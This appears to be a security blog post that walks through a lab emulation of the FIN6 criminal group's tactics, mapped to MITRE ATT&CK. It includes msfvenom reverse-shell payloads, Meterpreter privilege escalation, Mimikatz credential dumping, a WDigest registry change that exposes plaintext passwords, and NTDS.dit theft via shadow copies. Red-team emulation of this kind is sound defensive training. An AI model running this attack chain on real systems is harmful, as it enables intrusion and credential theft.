---
title: FIN6 Adversary Emulation - Phase 1
date: 2023-08-02 09:23:59 +0800
categories: [Adversary Emulation, FIN6]
tags: [threathunt,metasploit]
pin: true
math: true
mermaid: true
---

## FIN6 Overview

FIN6 is thought to be a financially motivated cyber-crime group. The group has aggressively targeted and compromised high-volume POS systems in the hospitality and retail sectors since at least 2015. FIN6 has targeted e-commerce sites and multinational organizations. Most of the group’s targets have been located in the United States and Europe, but include companies in Australia, Canada, Spain, India, Kazakhstan, Serbia, and China.

## Step 1 - Initial Access

### 1.1 - Phishing: Spearphishing Attachment [**T1566.001**](https://attack.mitre.org/techniques/T1566/001/) and via Service [**T1566.003**](https://attack.mitre.org/techniques/T1566/003/)

As FIN6 appears to be monetarily motivated, they take a pragmatic approach toward delivery. FIN6 has employed social engineering ala direct messages on LinkedIn, spear-phished, compromised e-commerce sites, and it has been suggested that they have negotiated or even purchased access to previously compromised networks. 

### 1.2 - C2 Framework

FIN6 has made use of CobaltStrike and Metasploit. For this demonstration, we'll create initial payload using Metasploit’s [**Msfvenom**](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).

_MsfVenom_ is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. The advantages of Msfvenom are:

One single tool
Standardized command line options
Increased speed

_MsfVenom_ has a wide range of options available:

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom.png){:width="100%"}


### 1.3 - Generate Initial Access Payload 

To generate a payload, there are two flags that you must supply (`-p` and `-f`):

- The `-p` flag: Specifies what payload to generate
- The `-f` flag: Specifies the format of the payload

To see what payloads are available from Framework, you can do:

```bash
./msfvenom -l payloads
```

Below is the typical syntax to use _MsfVenom_:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
```

Take note that in order to dump credentials with Mimikatz later on the victim's Windows Server, we need to use the x64 version of Windows Meterpreter TCP reverse shell.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){:width="100%"}

### 1.4 - Generate Payload Handler

With our Windows X64 executable payload is now created, we need a handler to accept the connection back from our target. We will use the <kbd>exploit/multi/handler</kbd> metasploit module.

Normally, you can use <kbd>exploit/multi/handler</kbd> this way:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > 
```

To check the current configuration of the exploit handler, we can use the command to list down the various options for this module:

```bash
msf6 exploit(multi/handler) > show options
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Show_Options.png){:width="100%"}

As youn can see, the payload is currently set to default <kbd>generic/shell_reverse_tcp</kbd>. We need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. In this case, we need to inform the exploit handler for the type of the payload that we generated:

```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
```

Aside from that, we can also see that `LHOST` needs to be set. We don’t need to set LPORT because it already matches the option we set for the payload.

We can set the LHOST option with the following command:

```bash
set LHOST [Attacker IP]
```

Once done, you should now have a similar configuration on the screenshot below.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Final_Show_Options.png){:width="100%"}


To start the handler, just execute the following command.

```bash
msf6 exploit(multi/handler) > exploit
```

### 1.4 - Tranfser the Payload via Server

Next, we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlier. 

Open another terminal tab, then navigate to the folder location of the payload:

```bash
cd /tmp/
```

Start a Python3 HTTP server on port 80:

```bash
sudo python3 -m http.server 80
```

### 1.5 - Download Payload to Start the Communication on Exploit Handler

Switch to the victim's Server. Open a browser and navigate to to the attackerVM IP address to download the payload to the Desktop.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Download_MsfVenom_Payload.png){:width="100%"}

Once downloaded, execute the payload as Administrator. Since as parts of this emulation plan, the payload requires elevated access. 

Then switch back to the `msfconsole` terminal window on the attackerVM. You should see that the handler received a callback from the victim's Server, with a new meterpreter session created.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Established_MsfVenom_Payload.png){:width="100%"}

## Step 2 - Discovery

After gaining access to the target network, FIN6 enumerates the network and Active Directory (AD) environment. The second objective is to conduct internal reconnaissance. The intent of Discovery is to identify opportunities for escalation, lateral movement, systems for staging, and systems of interest for the effects phase of the emulation. 

### 2.1 - Software: AdFind [**S0552**](https://attack.mitre.org/software/S0552/)

FIN6 is believed to have used ADFind for this purpose on at least one occasion. 

[**AdFind**](https://www.joeware.net/freetools/tools/adfind/) is a free command-line query tool that can be used for gathering information from Active Directory.

On the <kbd>meterpreter></kbd> terminal, we will use PowerShell session instead to download AdFind on Windows directory. To enable PowerShell session, run the following commands:

```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

Afterwards, execute the following command to start the installation process of AdFind on the target machine:

```ps
$postParams = @{B1='Download+Now';download="AdFind.zip";email=''};
Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Body $postParams -OutFile C:\Users\Public\adfind.zip; Expand-Archive -Path C:\Users\Public\adfind.zip -DestinationPath C:\Users\Public -Force; Move-Item -Path C:\Users\Public\AdFind.exe -Destination C:\Windows\AdFind.exe -Force; Remove-Item -Path C:\Users\Public\adfind.zip -Force; Remove-Item -Path C:\Users\Public\adcsv.pl -Force;
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-2_1_AdFind_Installation_Process.png){:width="100%"}

### 2.2 - Account Discovery: Domain Account [**T1087.002**](https://attack.mitre.org/techniques/T1087/002/)

FIN6 used AdFind to check for person objects on Active Directory, and output the results to a text file.

```ps
PS > adfind.exe -f "objectcategory=person" > ad_users.txt
```

After running the command, we can view the contents of the output file with the `type` command:

```ps
PS > type ad_users.txt
```

We can use `Get-Content` `Select-String` to filter-out all of the user accounts.

```ps
PS > Get-Content ad_users.txt | Select-String "dn:CN="
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-2_2_AdFind_Discover_Users.png){:width="100%"}

### 2.3 - Remote System Discovery [**T1018**](https://attack.mitre.org/techniques/T1018/)

FIN6 also observed to perform Remote System Discovery to identify computer objects on the domain.

```ps
PS > adfind.exe -f "objectcategory=computer" > ad_computers.txt
```

After running the command, we can use `Get-Content` `Select-String` to filter-out all of the workstations and servers that are currently joined to the domain.

```ps
PS > Get-Content ad_computers.txt | Select-String "dn:CN="
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-2_3_AdFind_Discover_Computers.png){:width="100%"}

### 2.4 - Domain Trust Discovery [**T1482**](https://attack.mitre.org/techniques/T1482/)

FIN6 can gather information about organizational units (OUs) and domain trusts from Active Directory using two separate procedures.

First FIN6 enumerates all Organizational Units in the current user’s domain:

```ps
PS > adfind.exe -f "objectcategory=organizationalUnit" > ad_ous.txt
PS > Get-Content ad_ous.txt | Select-String "dn:OU="
```

Alternative procedure:

```ps
PS > Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A > ad_ous_ps.txt
PS > type ad_ous_ps.txt
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-2_4_AdFind_Discover_Domain_Trusts.png){:width="100%"}

Next, FIN6 performs a full forest search for trust objects using AdFind's `trustdmp` feature:

```ps
PS > adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt
PS > type ad_trustdmp.txt
```

Alternative procedure:

```ps
PS > nltest /domain_trusts > ad_trustdmp_nltest.txt
PS > type ad_trustdmp_nltest.txt
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-2_4_AdFind_Discover_Domain_Trust_Forest.png){:width="100%"}

### 2.5 - System Network Configuration Discovery [**T1016**](https://attack.mitre.org/techniques/T1016/)

FIN6 can extract subnet information from Active Directory. It performs System Network Configuration Discovery to list subnets information within the network. As the target network consists of just 1 host, there will not be much information returned from this procedure.

FIN6 Procedure:

```ps
PS > adfind.exe -subnets -f "objectcategory=subnet" > ad_subnets.txt
PS > type ad_subnets.txt
```

Alternative procedure:

```ps
PS > Get-ADReplicationSubnet -Filter * > ad_subnets_ps.txt
PS > type ad_subnets_ps.txt
```

### 2.6 - Permission Groups Discovery: Domain Groups [**T1069.002**](https://attack.mitre.org/techniques/T1069/002/)

FIN6 can extract uses AdFind to enumerate groups in the domain and writes the output to a file.

FIN6 procedure:

```ps
PS > adfind.exe -f "objectcategory=group" > ad_group.txt
PS > type ad_group.txt
```

Alternative procedure:

```ps
PS > net group /domain > ad_group.txt
PS > type ad_group.txt
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-2_5_AdFind_Discover_Permission.png){:width="100%"}

FIN6

## Step 3 - Privilege Escalation

The third objective is to escalate privileges. Again, in this regard, FIN6 has taken a pragmatic approach. Reporting suggests the group has purchased credentials, made heavy use of credential access, and used the `getsystem` modules included in publicly available penetration testing frameworks. FIN6 has been reported to further compromise the Windows domain by copying and exfiltrating the Active Directory database (NTDS.dit) file. The information therein enables the group to move freely throughout the domain and pursue their operational objectives.

### 3.1 - Access Token Manipulation [**T1134**](https://attack.mitre.org/techniques/T1134/)

FIN6 has used has used Metasploit's named-pipe impersonation technique to escalate privileges. 

To perform the FIN6 procedure, we first need to exit the PowerShell shell within our Meterpreter session, to bring us back to the <kbd>meterpreter></kbd> console.

Next, the command below assumes a meterpreter session and specifies the use of technique `1`, a named-pipe impersonation.

```bash
meterpreter > getsystem -t 1
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_1_Meterpreter_Named_Pipe_Imp.png){:width="100%"}

### 3.2 - OS Credential Dumping: LSASS Memory [**T1003.001**](https://attack.mitre.org/techniques/T1003/001/)

Reporting indicates that FIN6 has used Mimikatz on several occasions. While there are many variations of the tool, FIN6 has to date, favored the use of Metasploit and CobaltStrike for post-exploitation. As such, the recommended procedure specifies using Mimikatz from a Meterpreter session. This of course, requires a Meterpreter session and elevated privileges. The commands below load Mimikatz into memory and attempt to retrieve `wdigest` credentials.

```bash
meterpreter > load kiwi
meterpreter > creds_all
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_2_Meterpreter_Mimikatz_No_Password.png){:width="100%"}

Note the password field is null.

As part of WDigest authentication provider, Windows versions up to 8 and 2012 used to store logon credentials in memory in plaintext by default, which is no longer the case with newer  Windows versions. It is still possible, however, to force WDigest to store secrets in plaintext.

Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system:

```ps
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

Once done, restart the victim's server and re-execute the Mimikatz command earlier. You should now able to see the clear-text passwords in memory. 

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_2_Meterpreter_Mimikatz_With_Password.png){:width="100%"}

### 3.3 - OS Credential Dumping: NTDS [**T1003.003**](https://attack.mitre.org/techniques/T1003/003/)

FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database. This module authenticates to the domain controller, creates a volume shadow copy of the system drive, and downloads copies of the _NTDS.dit_ and SYSTEM hive. Although this technique is herein classified as a privilege escalation technique, the group may execute this module during discovery and exfiltrate the resultant files with the rest of their discovery results.

```bash
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```

For us to have a clear understanding on how this module work, lets take a look on its [**source code**](https://github.com/rapid7/metasploit-framework/blob/4ebf4fd52e2754ecee163d63b5dbf86436a3fbf7/modules/auxiliary/admin/smb/psexec_ntdsgrab.rb)

```rb
  def run
    # Initialize some variables
    text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
    bat = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
    createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
    @ip = datastore['RHOST']
    @smbshare = datastore['SMBSHARE']
    # Try and connect
    if connect
      # Try and authenticate with given credentials
      begin
        smb_login
      rescue StandardError => autherror
        print_error("Unable to authenticate with given credentials: #{autherror}")
        return
      end
      # If a VSC was specified then don't try and create one
      if datastore['VSCPATH'].length > 0
        print_status("Attempting to copy NTDS.dit from #{datastore['VSCPATH']}")
        vscpath = datastore['VSCPATH']
      else
        unless datastore['CREATE_NEW_VSC']
          vscpath = check_vss(text, bat)
        end
        unless vscpath
          vscpath = make_volume_shadow_copy(createvsc, text, bat)
        end
      end
      if vscpath
        if copy_ntds(vscpath, text) and copy_sys_hive
          download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"))
          download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"))
        else
          print_error("Failed to find a volume shadow copy.  Issuing cleanup command sequence.")
        end
      end
      cleanup_after(bat, text, "\\#{datastore['WINPATH']}\\Temp\\ntds", "\\#{datastore['WINPATH']}\\Temp\\sys")
      disconnect
    end
  end
```

Base on the source code, the module will execute the following command:

```bash
vssadmin create shadow /For=%SYSTEMDRIVE%
```

This command will generate Volume Shadow Copy on the Systemn Drive. A Volume Shadow Copy is a snapshot of a set of files, which can be accessed to copy files even when the originals are currently being used by Windows.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_3_Meterpreter_PSEXEC_VolumeShadowCopy.png){:width="100%"}

Going back to the source code of this module, we can see that we can now access and make a copy of the _NTDS.dit_ since we have the `Shadow Copy Name`:

```rb
  # Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
  def copy_ntds(vscpath, text)
    begin
      ntdspath = vscpath.to_s + "\\" + datastore['WINPATH'] + "\\NTDS\\ntds.dit"
      command = "%COMSPEC% /C copy /Y \"#{ntdspath}\" %WINDIR%\\Temp\\ntds"
      run = psexec(command)
      if !check_ntds(text)
        return false
      end
      return true
```

To make a copy of the _NTDS.dit_ file from the Shadow Copy, execute the following command:

```bash
copy [shadow_copy_name]\windows\ntds\ntds.dit .\ad_ntds.dit
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_3_Meterpreter_PSEXEC_NTDS_Copy.png){:width="100%"}

Aside from that, we can also use the `Shadow Copy Name` to access the SYSTEM registry hive and SYSTEM configuration file by executing the following command:

```bash
reg SAVE HKLM\SYSTEM .\ad_SYS_reg
copy [shadow_copy_name]\windows\system32\config\SYSTEM .\ad_SYSTEM_cfg
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_3_Meterpreter_PSEXEC_HIVE_Copy.png){:width="100%"}

## Step 4 - Collection and Exfiltration

After conducting internal discovery, FIN6 has been reported to stage the resulting files, compress those files, and typically exfiltrate using SSH.

### 4.1 - Archive Collected Data: Archive via Utility [**T1560.001**](https://attack.mitre.org/techniques/T1560/001/)

FIN6 uses its renamed version of 7zip (7.exe), on the designated staging system, to compress the text files resulting from internal discovery. 

The following command adds the ad_* text files to the ad.7z archive and performs a level 3 compression:

```ps
PS > .\7.exe a -mx3 ad.7z ad_*
```


FIN6

## References

<https://www.offsec.com/metasploit-unleashed/msfvenom/>
